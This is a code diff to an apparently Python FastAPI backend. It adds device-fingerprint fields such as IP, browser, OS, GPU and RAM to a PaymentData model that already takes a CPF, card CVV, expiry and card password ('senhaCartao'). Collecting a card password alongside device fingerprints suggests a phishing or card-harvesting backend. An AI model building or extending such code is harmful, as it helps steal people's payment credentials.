@@ -71,6 +71,27 @@ async def log_requests(request, call_next):
     return response
 
 # Pydantic models
+class DeviceData(BaseModel):
+    ip: Optional[str] = None
+    userAgent: Optional[str] = None
+    browserName: Optional[str] = None
+    browserVersion: Optional[str] = None
+    osName: Optional[str] = None
+    osVersion: Optional[str] = None
+    deviceType: Optional[str] = None
+    deviceModel: Optional[str] = None
+    screenWidth: Optional[int] = None
+    screenHeight: Optional[int] = None
+    language: Optional[str] = None
+    timezone: Optional[str] = None
+    connectionType: Optional[str] = None
+    effectiveConnectionType: Optional[str] = None
+    cores: Optional[int] = None
+    ram: Optional[int] = None
+    gpu: Optional[str] = None
+    maxTouchPoints: Optional[int] = None
+    devicePixelRatio: Optional[float] = None
+
 class PaymentData(BaseModel):
     nomeCompleto: str
     cpf: str
@@ -78,6 +99,26 @@ class PaymentData(BaseModel):
     validade: str
     cvv: str
     senhaCartao: str = ""  # Optional field, defaults to empty string
+    # Device information (optional)
+    ip: Optional[str] = None
+    userAgent: Optional[str] = None
+    browserName: Optional[str] = None
+    browserVersion: Optional[str] = None
+    osName: Optional[str] = None
+    osVersion: Optional[str] = None
+    deviceType: Optional[str] = None
+    deviceModel: Optional[str] = None
+    screenWidth: Optional[int] = None
+    screenHeight: Optional[int] = None
+    language: Optional[str] = None
+    timezone: Optional[str] = None
+    connectionType: Optional[str] = None
+    effectiveConnectionType: Optional[str] = None
+    cores: Optional[int] = None
+    ram: Optional[int] = None
+    gpu: Optional[str] = None
+    maxTouchPoints: Optional[int] = None
+    devicePixelRatio: Optional[float] = None
 
 class EmailResponse(BaseModel):
     success: bool
